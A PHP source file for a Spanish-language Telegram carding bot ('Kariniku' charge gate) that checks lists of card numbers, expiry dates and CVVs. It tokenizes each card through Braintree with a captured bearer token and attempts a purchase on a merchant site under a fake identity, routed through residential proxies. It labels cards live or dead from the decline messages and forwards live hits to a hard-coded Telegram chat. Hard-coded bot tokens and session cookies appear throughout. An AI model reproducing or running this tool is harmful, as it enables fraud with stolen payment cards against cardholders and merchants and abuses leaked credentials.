<?php


///////////////////////////////////////////
///////////////[BOT FlowChk]///////////////
$tokenFlowChk = '6967678175:AAHJ0jVV5YtPHHOZ0au7EjX_urESwjSgKM4';
$urlFlowChk = 'https://4a0d-91-126-108-104.ngrok-free.app/flowchkbot/main.php';
$apiFlowChk = "https://api.telegram.org/bot$tokenFlowChk/";
file_get_contents($apiFlowChk . "setWebhook?url=" . urlencode($urlFlowChk));
///////////////[BOT FlowChk]///////////////
///////////////////////////////////////////



/////////////////////////////////////////////////////
///////////////[Procesamiento FlowChk]///////////////
$update = json_decode(file_get_contents("php://input"), true);
$updateJson = json_encode($update);
//obtener los mensajes
$ChatIdMensaje = $update['message']['chat']['id'];
$TipoChat = $update['message']['chat']['type'];
$TextoDelMensaje = $update['message']['text'];
$IDelMensaje = $update['message']['message_id'];
$usernameMensaje = $update["message"]["from"]["username"];
$userIdMensaje = $update["message"]["from"]["id"];
//obtener los callbacks
$DatosDelCallBack = $update['callback_query']['data'];
$ChatIdCallback = $update['callback_query']['message']['chat']['id'];
$IDelCallback = $update['callback_query']['message']['message_id'];
$usernameCallback = $update['callback_query']["from"]["username"];
///////////////[Procesamiento FlowChk]///////////////
////////////////////////////////////////////////////


function enviarMensaje($mensaje,$chat,$idmsg){
    file_get_contents("https://api.telegram.org/bot6967678175:AAHJ0jVV5YtPHHOZ0au7EjX_urESwjSgKM4/sendPhoto?photo=https://th.bing.com/th/id/OIG.ueC_HTa1KMozWPVnwcGr?pid=ImgGn&w=1024&h=1024&rs=1&reply_to_message_id=$idmsg&chat_id=".$chat."&caption=" . urlencode($mensaje) . "&parse_mode=HTML");
}

function editarMensaje($mensaje,$chat,$idmsg,$editID){
    file_get_contents("https://api.telegram.org/bot6967678175:AAHJ0jVV5YtPHHOZ0au7EjX_urESwjSgKM4/deleteMessage?message_id=$editID&chat_id=".$chat);
    file_get_contents("https://api.telegram.org/bot6967678175:AAHJ0jVV5YtPHHOZ0au7EjX_urESwjSgKM4/sendPhoto?photo=https://th.bing.com/th/id/OIG.ueC_HTa1KMozWPVnwcGr?pid=ImgGn&w=1024&h=1024&rs=1&reply_to_message_id=$idmsg&chat_id=".$chat."&caption=" . urlencode($mensaje) . "&parse_mode=HTML");
}

function enviarLive($respuesta,$chat){
    file_get_contents("https://api.telegram.org/bot6959067849:AAFrFCPGdxiyr-CZtkkMIJXII0AY4Ijknsw/sendPhoto?photo=https://th.bing.com/th/id/OIG.ueC_HTa1KMozWPVnwcGr?pid=ImgGn&w=1024&h=1024&rs=1&chat_id=".$chat."&caption=" . urlencode($respuesta) . "&parse_mode=HTML");
    file_get_contents("https://api.telegram.org/bot6959067849:AAFrFCPGdxiyr-CZtkkMIJXII0AY4Ijknsw/sendPhoto?photo=https://th.bing.com/th/id/OIG.ueC_HTa1KMozWPVnwcGr?pid=ImgGn&w=1024&h=1024&rs=1&chat_id=995535382&caption=" . urlencode($respuesta) . "&parse_mode=HTML");
}

function ka($lista,$chat,$IDelMensaje,$usrID){

$mensaje = "<b>
⚡ 𝙂𝘼𝙏𝙀 💻 Kariniku [𝘾𝙃𝘼𝙍𝙂𝙀] ⚡
━━ ━ ━ ━ ━ ━ ━ ━ ━━
⌛ 𝘾𝙊𝙈𝙋𝙍𝙊𝘽𝘼𝙉𝘿𝙊 𝘾𝘾 ⌛ 
💳 $lista
━━ ━ ━ ━ ━ ━ ━ ━ ━━
⚡ 𝘿𝙚𝙫 𝙗𝙮 : 「𝚁𝙶𝟺」 𝓣𝓱𝓮𝓕𝓵𝓸𝔀𝓜𝓪𝓷 ⚡</b>";
$enviar = json_decode(file_get_contents("https://api.telegram.org/bot6967678175:AAHJ0jVV5YtPHHOZ0au7EjX_urESwjSgKM4/sendPhoto?photo=https://th.bing.com/th/id/OIG.ueC_HTa1KMozWPVnwcGr?pid=ImgGn&w=1024&h=1024&rs=1&reply_to_message_id=$IDelMensaje&chat_id=".$chat."&caption=" . urlencode($mensaje) . "&parse_mode=HTML") ,1);
$mes_id = $enviar['result']['message_id'];

$lista = str_replace(array(":", ";", ",", "|", "»", "/", "\\", " "), "|", $lista);
$separa = explode("|", $lista);
$numero = trim($separa[0]);
$binNumero = substr($numero,0,6);
$last = substr($numero, 12,16);
$mes = trim($separa[1]);
$ano = trim($separa[2]);
$ano1 = substr($ano,2,2);
$exp = $mes.''.$ano1;
$cvv = trim($separa[3]);

$poxySocks4 = rebootproxys();
$Proxys = explode(":", $poxySocks4);
$proxy_host = $Proxys[0];
$proxy_port = $Proxys[1];
$max_retries = 3; 
$retry = 0;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bins.antipublic.cc/bins/'.$binNumero.'');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$fim = curl_exec($ch);
$banco = value($fim, '"bank":"', '"');
$tipo = value($fim, '"type":"', '"');
$pais = value($fim, '"country_name":"', '"');
$nivel = value($fim, '"level":"', '"');
$bandera = value($fim, '"country_flag":"', '"');


while ($retry < $max_retries) { 
////////////////////////////////////////////////////////////





$url = 'https://payments.braintree-api.com/graphql';

$headers = array(
    'accept: */*',
    'accept-language: es-ES,es;q=0.9',
    'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDA4NzA2MDksImp0aSI6IjJkMzdlOTU2LThkYzMtNGRhMi1hNDlmLTg5Y2NhODRkZDhkZSIsInN1YiI6Ijh0enZ6eGh0cW00eDVwNDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh0enZ6eGh0cW00eDVwNDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.by7s_wDlD4CNMsWgEPeJ9UVw579VUErnq3JJUJ03sDKhbCHiDcnbFH_o-_WTpvbGyuBrZc3aRRIb1S4uWjoe4w',
    'braintree-version: 2018-05-10',
    'content-type: application/json',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
    'sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
);

$data = array(
    'clientSdkMetadata' => array(
        'source' => 'client',
        'integration' => 'dropin2',
        'sessionId' => '967ded63-7edd-4243-a5fd-f3f53c87eb61',
    ),
    'query' => 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables' => array(
        'input' => array(
            'creditCard' => array(
                'number' => $numero,
                'expirationMonth' => $mes,
                'expirationYear' => $ano,
                'cvv' => $cvv,
            ),
            'options' => array(
                'validate' => false,
            ),
        ),
    ),
    'operationName' => 'TokenizeCreditCard',
);

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
$token = value($response,'"token":"','"');


$url = 'https://emindweb.com/site/transaction.php';
$headers = array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'cookie: PHPSESSID=0d5bbb05343fa36b77389d2b8f0f2266; _ga=GA1.2.776923326.1700263229; _gid=GA1.2.301030258.1700784206; _ga_8GHHGYLDX4=GS1.2.1700784206.8.1.1700784210.56.0.0',
    'origin: https://emindweb.com',
    'referer: https://emindweb.com/site/transaction.php',
);

$data = 'purchased=1%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C*&discount=0&promo=&adminNameF=Jame&adminNameL=Nims&adminEmail=jamenims123%40yopmail.com&siteName=LucasSchool&siteAdd1=1703+pheasant+road&siteCity=gladewater&siteState=Tx&siteZip=75647&siteCountry=United+States&siteEmail=jamenims123%40yopmail.com&siteID=&capCode=ztjnfx&payment_method_nonce='.$token.'';

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, 'la.residential.rayobyte.com');
curl_setopt($ch, CURLOPT_PROXYPORT, '8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$poxySocks4);
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
$response = value($response,'Error:','<br/>');
echo $response;


if (empty($response)) {
    $retry++;
}elseif(strpos($response, " than 3 times") !== false) {
$retry++;
}else{
if (strpos($response, "Card Issuer Declined CVV") !== false) {
  $estado = '𝓒𝓒𝓝 ✅';
$respuestaLive = "<b>    
⚡ 𝙂𝘼𝙏𝙀 💻 Kariniku [𝘾𝙃𝘼𝙍𝙂𝙀] ⚡
━━ ━ ━ ━ ━ ━ ━ ━ ━━
💳 ┌𝘾𝘾 ➳ <code>$lista</code>
⌛ ├𝙎𝙩𝙖𝙩𝙪𝙨 ➳ [$estado] 
⌛ └𝙈𝙚𝙨𝙨𝙖𝙜𝙚 ➳ [$response]
━━ ━ ━ ━ ━ ━ ━ ━ ━━
➳ 𝘽𝙖𝙣𝙠 𝘿𝙚𝙩𝙖𝙞𝙡𝙨:
🪪 ┌𝘽𝙞𝙣 ➳ $binNumero|$tipo|$nivel
🏛 ├𝘽𝙖𝙣𝙠 ➳ $banco
🌍 └𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➳ $pais|$bandera
━━ ━ ━ ━ ━ ━ ━ ━ ━━
Retry [$retry]
━━ ━ ━ ━ ━ ━ ━ ━ ━━
⚡ 𝘿𝙚𝙫 𝙗𝙮 : 「𝚁𝙶𝟺」 𝓣𝓱𝓮𝓕𝓵𝓸𝔀𝓜𝓪𝓷 ⚡</b>";
enviarLive($respuestaLive,$usrID);
}elseif (strpos($response, "Insufficient Funds") !== false) {
  $estado = '𝓛𝓘𝓥𝓔 ✅';
$respuestaLive = "<b>
⚡ 𝙂𝘼𝙏𝙀 💻 Kariniku [𝘾𝙃𝘼𝙍𝙂𝙀] ⚡
━━ ━ ━ ━ ━ ━ ━ ━ ━━
💳 ┌𝘾𝘾 ➳ <code>$lista</code>
⌛ ├𝙎𝙩𝙖𝙩𝙪𝙨 ➳ [$estado] 
⌛ └𝙈𝙚𝙨𝙨𝙖𝙜𝙚 ➳ [$response]
━━ ━ ━ ━ ━ ━ ━ ━ ━━
➳ 𝘽𝙖𝙣𝙠 𝘿𝙚𝙩𝙖𝙞𝙡𝙨:
🪪 ┌𝘽𝙞𝙣 ➳ $binNumero|$tipo|$nivel
🏛 ├𝘽𝙖𝙣𝙠 ➳ $banco
🌍 └𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➳ $pais|$bandera
━━ ━ ━ ━ ━ ━ ━ ━ ━━
Retry [$retry]
━━ ━ ━ ━ ━ ━ ━ ━ ━━
⚡ 𝘿𝙚𝙫 𝙗𝙮 : 「𝚁𝙶𝟺」 𝓣𝓱𝓮𝓕𝓵𝓸𝔀𝓜𝓪𝓷 ⚡</b>";
enviarLive($respuestaLive,$usrID);
}else {
  $estado = '𝓓𝓔𝓐𝓓 ❌';
}


$respuestaLive = "<b>
⚡ 𝙂𝘼𝙏𝙀 💻 Kariniku [𝘾𝙃𝘼𝙍𝙂𝙀] ⚡
━━ ━ ━ ━ ━ ━ ━ ━ ━━
💳 ┌𝘾𝘾 ➳ <code>$lista</code>
⌛ ├𝙎𝙩𝙖𝙩𝙪𝙨 ➳ [$estado] 
⌛ └𝙈𝙚𝙨𝙨𝙖𝙜𝙚 ➳ [$response]
━━ ━ ━ ━ ━ ━ ━ ━ ━━
➳ 𝘽𝙖𝙣𝙠 𝘿𝙚𝙩𝙖𝙞𝙡𝙨:
🪪 ┌𝘽𝙞𝙣 ➳ $binNumero|$tipo|$nivel
🏛 ├𝘽𝙖𝙣𝙠 ➳ $banco
🌍 └𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➳ $pais|$bandera
━━ ━ ━ ━ ━ ━ ━ ━ ━━
Retry [$retry]
━━ ━ ━ ━ ━ ━ ━ ━ ━━
⚡ 𝘿𝙚𝙫 𝙗𝙮 : 「𝚁𝙶𝟺」 𝓣𝓱𝓮𝓕𝓵𝓸𝔀𝓜𝓪𝓷 ⚡</b>";
editarMensaje($respuestaLive,$chat,$IDelMensaje,$mes_id);
break;
}
}
if ($retry === $max_retries) {
  $estado1 = 'DIE';
  $color = 'red';
  $estado = 'DEAD ❌';

$respuestaLive = "<b>
⚡ 𝙂𝘼𝙏𝙀 💻 Kariniku [𝘾𝙃𝘼𝙍𝙂𝙀] ⚡
━━ ━ ━ ━ ━ ━ ━ ━ ━━
💳 ┌𝘾𝘾 ➳ <code>$lista</code>
⌛ ├𝙎𝙩𝙖𝙩𝙪𝙨 ➳ [$estado] 
⌛ └𝙈𝙚𝙨𝙨𝙖𝙜𝙚 ➳ [PROXY DEAD]
━━ ━ ━ ━ ━ ━ ━ ━ ━━
➳ 𝘽𝙖𝙣𝙠 𝘿𝙚𝙩𝙖𝙞𝙡𝙨:
🪪 ┌𝘽𝙞𝙣 ➳ $binNumero|$tipo|$nivel
🏛 ├𝘽𝙖𝙣𝙠 ➳ $banco
🌍 └𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➳ $pais|$bandera
━━ ━ ━ ━ ━ ━ ━ ━ ━━
Retry [$retry]
━━ ━ ━ ━ ━ ━ ━ ━ ━━
⚡ 𝘿𝙚𝙫 𝙗𝙮 : 「𝚁𝙶𝟺」 𝓣𝓱𝓮𝓕𝓵𝓸𝔀𝓜𝓪𝓷 ⚡</b>";
editarMensaje($respuestaLive,$chat,$IDelMensaje,$mes_id);
}
}




$command_parts = explode('/ka', $TextoDelMensaje);
$lista = trim($command_parts[1]);
ka($lista,$ChatIdMensaje,$IDelMensaje,$userIdMensaje);


?>